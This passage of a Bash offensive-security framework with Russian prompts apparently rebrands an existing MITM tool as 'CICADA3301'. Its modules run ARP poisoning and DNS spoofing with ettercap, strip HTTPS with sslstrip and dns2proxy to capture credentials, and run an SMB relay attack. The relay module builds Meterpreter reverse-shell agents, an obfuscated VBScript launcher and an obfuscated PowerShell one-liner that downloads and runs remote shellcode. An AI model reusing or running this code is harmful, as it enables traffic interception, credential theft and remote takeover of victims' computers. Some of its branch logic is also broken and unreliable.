if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
crypto=$(zenity --title="☠ ДОМЕННОЕ ИМЯ ФИЛЬТР ☠" --text "пример: coin-hive.com \Выберите доменное имя для фильтрации через CICADA3301.." --entry --width 270) > /dev/null 2>&1
fil_one=$(zenity --title="☠ ХОСТ ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал цель для фильтрации CICADA3301." --entry --width 270) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/cryptocurrency.eft $IPATH/filters/cryptocurrency.rb > /dev/null 2>&1
  cd $IPATH/filters/
  sed -i "s|CrYpT|$crypto|g" cryptocurrency.eft
  sed -i "s|TaRONE|$fil_one|g" cryptocurrency.eft
  sleep 1

  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/cryptocurrency.eft"
  sleep 1

    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} составление template${RedF}!${Reset};
    xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/cryptocurrency.eft -o $IPATH/output/cryptocurrency.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs

      # run mitm+filter
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -L $IPATH/logs/cryptocurrency -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -Q -i $InT3R -F $IPATH/output/cryptocurrency.ef -L $IPATH/logs/cryptocurrency -M ARP /$rhost/ /$gateway/
        fi
      fi


  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/cryptocurrency.rb $IPATH/filters/cryptocurrency.eft > /dev/null 2>&1
  # port-forward
  # echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2
  rm $IPATH/output/cryptocurrency.ef > /dev/null 2>&1


    if [ -e $IPATH/logs/crypto-currency.log ]; then
      cd $IPATH/logs
        # delete utf-8/non-ancii caracters from logfile
        tr -cd '\11\12\15\40-\176' < crypto-currency.log > final.log
        sed -i "s|www||g" final.log
        sed -i "s|\!||g" final.log
        sed -i "s|\+||g" final.log
        sed -i "s|(||g" final.log
        mv final.log crypto-currency.log > /dev/null 2>&1
        rm final.log > /dev/null 2>&1
    fi
  cd $IPATH

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}





# ----------------------------------------------------
# REDIRECT TARGET TRAFIC TO GOOGLE EASTER EGGS (prank)
# ----------------------------------------------------
sh_stage19 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}      Этот модуль будет перенаправлять целевой браузерный серфинг под     ${BlueF}|"
echo "${BlueF}    | ${YellowF}     MITM-атаки на Google пасхальные яйца веб-страниц (Google Prank)    ${BlueF}|"
echo "${BlueF}    | ${YellowF}            'Все домены [.com] будут перенаправлены'              ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

#
# chose the easter egg to use under mitm+dns_spoof
#
EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "Список доступных гугл пасхальных яиц:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" FALSE "blink html" FALSE "google 180" --width 320 --height 230) > /dev/null 2>&1
#
# parse easter egg search string
#
if [ "$EGG" = "Do a Barrel roll" ]; then
  parsed="Do+a+Barrel+roll"
elif [ "$EGG" = "zerg rush" ]; then
  parsed="zerg+rush"
elif [ "$EGG" = "blink html" ]; then
  parsed="Blink+HTML"
else
  parsed="<head><style>body{-webkit-transform:rotate(-180deg) !important;-ms-transform:rotate(-180deg) !important;-moz-transform:rotate(-180deg) !important;}</style>"
fi



  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sleep 1
  # backup all files needed.
  cd $IPATH/bin
  cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
  cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
  cp $IPATH/filters/EasterEgg.eft $IPATH/filters/EasterEgg.rb > /dev/null 2>&1 # backup
  cp $IPATH/bin/phishing/EasterEgg.html $IPATH/bin/phishing/EasterEgg.bak > /dev/null 2>&1 # backup
  # use SED bash command to config our etter.dns
  sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
  sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
  cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};

    # using SED bash command to config redirect.eft
    if [ "$EGG" = "google 180" ]; then
      sed -i "s|IpAdR|$parsed|g" $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
    else
      sed -i "s|IpAdR|https://www.google.im/search?q=$parsed&gws_rd=ssl|g" $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
    fi

  echo ${BlueF}[☠]${white} google easter egg:${GreenF}$parsed ${Reset};
  # copy files needed to apache2 webroot...
  cd phishing/
  if [ "$EGG" = "google 180" ]; then
    cp $IPATH/bin/phishing/Google_prank_180/googlelogo_color_272x92dp.png $ApachE/googlelogo_color_272x92dp.png > /dev/null 2>&1
    cp $IPATH/bin/phishing/Google_prank_180/Google.html $ApachE/index.html > /dev/null 2>&1
  else
    sed -i "s|RePlAcE|$parsed|g" EasterEgg.html > /dev/null 2>&1
    cp $IPATH/bin/phishing/EasterEgg.html $ApachE/index.html > /dev/null 2>&1
  fi
cd $IPATH
sleep 1

# compiling packet_drop.eft to be used in ettercap
xterm -T "CICADA3301 СКРИПТИНГОВАЯ КОНСОЛЬ" -geometry 115x36 -e "nano $IPATH/filters/EasterEgg.eft"
echo ${BlueF}[☠]${white} составление EasterEgg.eft${RedF}!${Reset};
sleep 1
xterm -T "CICADA3301 - составление" -geometry 90x26 -e "etterfilter $IPATH/filters/EasterEgg.eft -o $IPATH/output/EasterEgg.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Запуск веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1

      # run mitm+filter
      cd $IPATH/logs
      echo ${BlueF}[☠]${white} Запуск ARP яд + фильтр Etter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Нажмите ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost// /$gateway//
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
        else
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost/ /$gateway/
        fi
      fi

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ ПОЖАЛУЙСТА ПОДОЖДИТЕ ☠" --text="Остановка веб-сервера apache2" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
  rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
  mv /tmp/etter.dns $Edns > /dev/null 2>&1
  mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
  mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1 # backup
  mv $IPATH/bin/phishing/EasterEgg.bak $IPATH/bin/phishing/EasterEgg.html > /dev/null 2>&1 # backup
  rm $ApachE/index.html > /dev/null 2>&1
  rm $ApachE/googlelogo_color_272x92dp.png > /dev/null 2>&1
  cd $IPATH
  sleep 2

else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}




# ----------------------------------------------------------------
# CAPTURE HTTPS CREDENTIALS (dns2proxy|sslstrip|ettercap|iptables)
# REF: https://www.guiadoti.com/2017/09/sslstrip-2-0-hsts-bypass/
# VID: http://www.youtube.com/watch?v=uGBjxfizy48
# ----------------------------------------------------------------
sh_stage20 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Этот модуль использует dns2proxy + sslstrip + ettercap + iptables для ${BlueF}|"
echo "${BlueF}    | ${YellowF} возможность захвата учетных данных https (ssl) через mitm + dns_spoofing ${BlueF}|"
echo "${BlueF}    | ${YellowF}         (путем понижения пакетов с HTTPS до HTTP)              ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo ${BlueF}[☠]${white} checking module dependencies ..${Reset};
sleep 2


#
# check dependencies (backend appl)
#
c=`dpkg -l python-twisted-web`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} python-twisted-web${RedF}:${GreenF} found .. ${Reset};
  sleep 1
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} python-twisted-web${RedF}:${GreenF} not found .. ${Reset};
  sleep 1
  echo ""
  apt-get install python-twisted-web
  echo ""
fi


t=`which sslstrip`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} sslstrip-0.9${RedF}:${GreenF} found .. ${Reset};
  sleep 1
  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} sslstrip-0.9${RedF}:${RedF} not found .. ${Reset};
  sleep 1
  cd $IPATH/bin/Utils/sslstrip-0.9
  echo ""
  python setup.py build & python setup.py install
  echo ""
  stripath=`locate sslstrip.py | grep "/usr/share/sslstrip"`
  cd $IPATH/
fi


if [ -e "$IPATH/bin/Utils/dns2proxy/dns2proxy.py" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} dns2proxy${RedF}:${GreenF} found .. ${Reset};
  sleep 1
  dnsproxypath="$IPATH/bin/Utils/dns2proxy/dns2proxy.py"
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} dns2proxy${RedF}:${RedF} not found .. ${Reset};
  sleep 1
fi


c=`pip install dnspython`
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[${GreenF}✔${BlueF}]${white} dnspython${RedF}:${GreenF} found .. ${Reset};
  sleep 1
else
  Fail="YES"
  echo ${BlueF}[${RedF}x${BlueF}]${white} dnspython${RedF}:${GreenF} not found .. ${Reset};
  sleep 1
  echo ""
  pip install dnspython
  echo ""
fi



#
# Restart tool after installing missing dependencies
#
if [ "$Fail" = "YES" ]; then
  echo ${BlueF}[${RedF}x${BlueF}]${white} restarting morpheus to finish installs ..${Reset};
  sleep 3
  exit
fi



#
# start of module funtions ..
#
cd $IPATH/output
if [ -e $stripath ]; then
  :
else
  echo ${BlueF}[${RedF}x${BlueF}]${white} SSLSTRIP installation NOT found ..${Reset};
  sleep 2
  exit
fi
rhost=$(zenity --title="☠ Введите RHOST ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Введите Шлюз ☠" --text "'настройки отравления для арфея CICADA3301 '\n\Оставьте пустым, чтобы отравить всю локальную сеть." --entry --width 270) > /dev/null 2>&1

  #
  # ip fowarding in iptables
  #
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  sleep 1
  echo "1" > /proc/sys/net/ipv4/ip_forward

  #
  # IPTABLES SETTINGS ..
  #
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53

  # ARP poison ..
  cd $IPATH/bin/Utils/dns2proxy
  if [ "$IpV" = "ACTIVE" ]; then
    echo ${GreenF}[☠]${white} Using IPv6 settings ${Reset};
    echo ${GreenF}[☠]${white} Нажмите [q] to quit arp poison ..${Reset};
    sleep 2
    xterm -T "CICADA3301 - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
  else
    echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
    echo ${GreenF}[☠]${white} Нажмите [q] to quit arp poison ..${Reset};
    sleep 2
    xterm -T "CICADA3301 - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost/ /$gateway/
  fi


  # clean all settings
  sleep 2
  echo ${BlueF}[☠]${white} cleaning settings .. ${Reset};
  sleep 2
  killall sslstrip > /dev/null 2>&1
  killall python > /dev/null 2>&1
  iptables --flush
  iptables --table nat --flush
  iptables --delete-chain
  iptables --table nat --delete-chain
  # reset ip-forward
  echo "0" > /proc/sys/net/ipv4/ip_forward
  echo ${BlueF}[☠]${white} editing sslstrip session log File ${Reset};
  sleep 4
  xterm -T "Журнал сеанса Sslstrip" -e "nano $IPATH/output/log.txt"
  sleep 2


else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}







# ----------------------------------------------------
# C&C SMBrelay attack (c&c smb exploit)
# ----------------------------------------------------
sh_stage21 () {
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Для атаки бокового движения эстафеты CICADA3301 SMB нам понадобится 2 шт.  ${BlueF}|"
echo "${BlueF}    | ${YellowF}(злоумышленник, цель) машина злоумышленника будет ждать любого авторизации ${BlueF}|"
echo "${BlueF}    | ${YellowF}пытается в локальной сети и использует захваченные хеши для аутентификации ${BlueF}|"
echo "${BlueF}    | ${YellowF}Сам на целевой машине, чтобы загрузить и выполнить удаленный наш агент.  ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2



# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выполнить этот модуль?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

#
# config module settings ..
#
echo ${BlueF}[☠]${white} Enter module settings!${Reset};
sleep 2
lhost=$(zenity --title="☠ Введите полезную нагрузку LHOST ☠" --text "пример: $IP" --entry --width 270) > /dev/null 2>&1
lport=$(zenity --title="☠ Введите полезную нагрузку LPORT ☠" --text "пример: 666" --entry --width 270) > /dev/null 2>&1


# select RHOST ..
scnt=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "\Выбрал вариант:" --radiolist --column "Выбирать" --column "вариант" TRUE "Сканирование локальной сети на наличие активных ресурсов" FALSE "Введите целевой IP-адрес[RHOST]" --width 320 --height 200) > /dev/null 2>&1

if [ "$scnt" = "Сканирование локальной сети на наличие активных ресурсов" ];then
  dtr=`date | awk {'print $4'}`
  ip_range=`ip route | grep "kernel" | awk {'print $1'}`
  nmap -sS -Pn -T4 -f --script smb-enum-shares.nse,smb-os-discovery.nse -p 445 $IP_RANGE -oN $IPATH/logs/SMBrelay.report | zenity --progress --pulsate --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text="[ $dtr ] Сканирование локальной сети на наличие акций" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  cat $IPATH/logs/SMBrelay.report | grep -v "RTTVAR" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 570 --height 470 > /dev/null 2>&1
  rhost=$(zenity --title="☠ Введите цель RHOST ☠" --text "пример: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
  shr=$(zenity --title="☠ Выбрать $rhost share ☠" --text "пример: ADMIN$ or C$ or IPC$" --entry --width 270) > /dev/null 2>&1
else
  rhost=$(zenity --title="☠ Введите цель RHOST ☠" --text "пример: 192.168.1.100" --entry --width 270) > /dev/null 2>&1
  shr=$(zenity --title="☠ Выбрать $rhost share ☠" --text "пример: ADMIN$ or C$ or IPC$" --entry --width 270) > /dev/null 2>&1
fi


  #
  # start metasploit services
  #
  echo ${BlueF}[☠]${white} Start metasploit services ..${Reset};
  service postgresql start > /dev/null 2>&1
    if [ "$RbUdB" = "YES" ]; then
      echo ${BlueF}[${GreenF}✔${BlueF}]${white} Rebuild msfdb [database] ..${Reset};
      msfdb reinit > /dev/null 2>&1
    fi


  #
  # check dependencies ..
  #
  echo ${BlueF}[☠]${white} Check module dependencies ..${Reset};
  sleep 2
  if [ -d /opt/impacket ]; then
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Python impacket libs found ..${Reset};
    sleep 2
  else
    echo ${BlueF}[${RedF}x${BlueF}]${white} Python impacket libs not found ..${Reset};
    sleep 2
    echo ${BlueF}[${GreenF}✔${BlueF}]${white} Installing impacket python libs ..${Reset};
    echo ""
    cd /opt
    git clone https://github.com/CoreSecurity/impacket.git
    cd impacket
    pip install ldap3
    python setup.py install
    echo ""
  fi


#
# build payload (.exe|.vbs) and trigger.bat
#
form=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "\Доступные агенты:" --radiolist --column "Выбирать" --column "вариант" TRUE "Построить агент binary.exe" FALSE "Сборка агента VBScript" FALSE "Построить агент PowerShell" --width 320 --height 230) > /dev/null 2>&1
if [ "$form" = "Build binary.exe agent" ]; then
  echo ${BlueF}[☠]${white} Building winhttps agent.exe ..${Reset};
  sleep 2
  xterm -T "CICADA3301 - Создать АГЕНТ.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f exe -n 20 -o $IPATH/output/agent.exe"
elif [ "$form" = "Сборка агента VBScript" ]; then
  echo ${BlueF}[☠]${white} Building winhttps agent.vbs ..${Reset};
  sleep 2
  xterm -T "CICADA3301 - Создать АГЕНТ.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
  disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
  echo "dIm f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1no\"+\"PSh\"&\"ElLn\"+\"oNI\":f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" $disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/agent.vbs
else
  echo ${BlueF}[☠]${white} Building http agent.ps1 ..${Reset};
  sleep 2
oneliner="PoWeRsHelL /W\`in 1 /n\`oP /Com\`mand \"0i=(\"{reve'+'rse_ht'+'tp}{wind'+'ows/}{met'+'erpr'+'eter/}\" -f'1','2','0');I\`EX ('({0}w-Obj\`ect {0}t.WebC\`lient).{1}Str\`ing(\"{2}bit'+'.ly/14b'+'ZZ'+'0c\")' -f'Ne','Down'+'load','htt'+'p://');In\`voke-Sh\`ell\`cod\`e –P\`ay\`loa\`d \$0i –Lh\`ost $lhost –Lp\`ort $lport –F\`or\`ce\""

# default ..
# oneliner="powershell.exe -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload windows/meterpreter/reverse_http –Lhost $lhost –Lport $lport –Force\""
fi



# Simulate the scanner attempting to connect to the share ..
# STRING: dir \\192.168.1.253\ADMIN$
echo ${BlueF}[☠]${white} Building trigger.bat ..${Reset};
sleep 2
cd $IPATH/bin
sed "s|RePlAcE|$rhost|g" trigger.bat > done.bat
sed -i "s|ShAr3|$shr|g" done.bat
mv done.bat $IPATH/output/trigger.bat


#
# final notes ..
#
if [ "$form" = "Построить агент binary.exe" ]; then
zenity --title "☠ ЗАКЛЮЧИТЕЛЬНЫЕ ЗАМЕЧАНИЯ ☠" --text "CICADA3301 теперь готов использовать боковую атаку SmbRelay \ движение, как только мы нажмем кнопку «да». \N\Если мы хотим [вручную] активировать уязвимость \ n, тогда нам понадобится ПК 3º, где мы собираемся \  чтобы выполнить файл [trigger.bat] для имитации одной попытки smb \ авт на локальной сети, чтобы CICADA3301 мог использовать \ тут захваченные учетные данные для загрузки / выполнения нашего \ nagent.exe в цель PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
elif [ "$form" = "Сборка агента VBScript" ]; then
zenity --title "☠ ЗАКЛЮЧИТЕЛЬНЫЕ ЗАМЕЧАНИЯ ☠" --text "CICADA3301 теперь готов использовать боковую атаку SmbRelay \ движение, как только мы нажмем кнопку «да». \N\Если мы хотим [вручную] активировать уязвимость \ n, тогда нам понадобится ПК 3º, где мы собираемся \  чтобы выполнить файл [trigger.bat] для имитации одной попытки smb \ авт на локальной сети, чтобы CICADA3301 мог использовать \ тут захваченные учетные данные для загрузки / выполнения нашего \ nagent.exe в цель PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
else
zenity --title "☠ ЗАКЛЮЧИТЕЛЬНЫЕ ЗАМЕЧАНИЯ ☠" --text "CICADA3301 теперь готов использовать боковую атаку SmbRelay \ движение, как только мы нажмем кнопку «да». \N\Если мы хотим [вручную] активировать уязвимость \ n, тогда нам понадобится ПК 3º, где мы собираемся \  чтобы выполнить файл [trigger.bat] для имитации одной попытки smb \ авт на локальной сети, чтобы CICADA3301 мог использовать \ тут захваченные учетные данные для загрузки / выполнения нашего \ nagent.exe в цель PC [ RHOST ]" --info --width 360 --height 270 > /dev/null 2>&1
fi


#
# smbrelay attack
#
cd $IPATH/bin/Utils
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Runing SMBRelay lateral movement ..${Reset};
if [ "$form" = "Построить агент binary.exe" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "CICADA3301 - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
elif [ "$form" = "Построить агент binary.exe" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.vbs & xterm -T "CICADA3301 - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
else
echo ${BlueF}[☠]${white} Agent:${BlueF} $oneliner ${Reset};
sleep 2
echo ""
python smbrelayx.py -h $rhost -c "$oneliner" & xterm -T "CICADA3301 - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
fi
echo ""


#
# clean
#
echo ${BlueF}[☠]${white} cleaning old files .. ${Reset};
sleep 2
service postgresql stop > /dev/null 2>&1
cd $IPATH/output/
killall python > /dev/null 2>&1
rm trigger.bat > /dev/null 2>&1
rm chars.raw > /dev/null 2>&1



#
#
else
  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
  sleep 2
fi
}



# ----------------------------------------
# tcp http headers infomation gather
# ----------------------------------------
sh_stage22 () {

echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}Этот модуль перехватывает выбранные «заголовки» http-запросов устройства. ${BlueF}|"
echo "${BlueF}    | ${YellowF}собрать информацию о настройках браузера целевой системы.       ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2

# run module?
rUn=$(zenity --question --title="☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Сбор информации заголовка HTTP tcp\Выполнить этот модуль?" --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
sleep 1
cp $IPATH/filters/IG.eft $IPATH/filters/IG.bak > /dev/null 2>&1
rhost=$(zenity --title="☠ УСТРОЙСТВО ДЛЯ ФИЛЬТРА ☠" --text "пример: $IP\выбрал удаленную цель для фильтрации через морфеус." --entry --width 270) > /dev/null 2>&1
# write taget ip addr in ip.mop so IG.sh can use it ..
echo "цель:$rhost" > $IPATH/output/ip.mop
#
# chose the type of capture
#
Tc=$(zenity --list --title "☠ CICADA3301 TCP/IP Bednakov-Xack-Live ☠" --text "Выберите тип захвата" --radiolist --column "Выбирать" --column "вариант" TRUE "захватывать только исходные пакеты ip" FALSE "захватить исходный и целевой пакеты" --width 350 --height 190) > /dev/null 2>&1
if [ "$Tc" = "захватывать только исходные пакеты ip" ]; then
  FCT="if (ip.src == '$rhost') {"
elif [ "$Tc" = "захватить исходный и целевой пакеты" ]; then
  FCT="if (ip.src == '$rhost' || ip.dst == '$rhost') {"
else
  echo ${RedF}[x] ${white}Please chose one ${RedF}capture Type${white} before Continue ..${Reset};
  # clean all stuff up ..
  sleep 2 && rm -f $IPATH/output/ip.mop > /dev/null 2>&1
  mv $IPATH/filters/IG.bak $IPATH/filters/IG.eft > /dev/null 2>&1
  exit
fi


  cd $IPATH/filters
  # replace values in template.filter with sed bash command
  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  sed -i "s|TaRgEt|$rhost|g" IG.eft
  sed -i "s/RepLaCe/$FCT/" IG.eft
  cd $IPATH
